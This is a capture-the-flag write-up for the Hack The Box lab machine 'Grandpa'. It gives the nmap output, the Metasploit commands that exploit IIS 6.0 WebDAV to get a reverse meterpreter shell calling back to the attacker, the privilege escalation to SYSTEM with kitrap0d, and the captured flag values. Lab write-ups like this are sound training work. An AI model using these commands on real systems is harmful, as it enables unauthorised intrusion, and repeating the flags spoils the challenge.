# Grandpa

## IP

> 10.10.10.14
## nmap Scan

```
nmap -T4 -A 10.10.10.14 -Pn
```

```a
Nmap scan report for 10.10.10.14
Host is up (0.12s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-ntlm-info: 
|   Target_Name: GRANPA
|   NetBIOS_Domain_Name: GRANPA
|   NetBIOS_Computer_Name: GRANPA
|   DNS_Domain_Name: granpa
|   DNS_Computer_Name: granpa
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Wed, 04 Aug 2021 04:18:02 GMT
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   71.66 ms  10.10.16.1
2   106.62 ms 10.10.10.14
```

## Open Ports
       
>80/tcp open  http    Microsoft IIS httpd 6.0

HTTP

## HTTP

http://10.10.10.14/

The server is using " Microsoft IIS httpd 6.0" so I searched online for exploits and found this [rapid7 link](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl/)

I followed the steps and I we got a meterpreter shell! But I cannot do anything, a lot of access denied :(

```
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set rhosts 10.10.10.14
set lhost tun0
```

I also tried using the suggester and all the options got access denied

> [+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.

The problem was that we were in a folder with no System Access

Locating a better folder

```ps```
![Image](https://github.com/MiguelCaputo/CTFs-writeups/blob/main/Hack%20The%20Box/Grandpa/Pasted%20image%2020210804003440.png)

We need to migrate to a session with Network Service

```migrate 1828```

```getuid```

>Server username: NT AUTHORITY\NETWORK SERVICE

Now we are an user on the machine, but still not System.... Lets try the suggester again 

```
use exploit/windows/local/ms10_015_kitrap0d
set session 1
set lhost tun0
run
```

We are System!!!

### Finding user.txt

```
cd c:\\"Documents and Settings"\\Harry\\Desktop
cat user.txt
```

> bdff5ec67c3cff017f2bedc146a5d869

### Finding root.txt

```
cd c:\\"Documents and Settings"\\Administrator\\Desktop
cat root.txt
```

> 9359e905a2c35f861f6a57cecf28bb7b
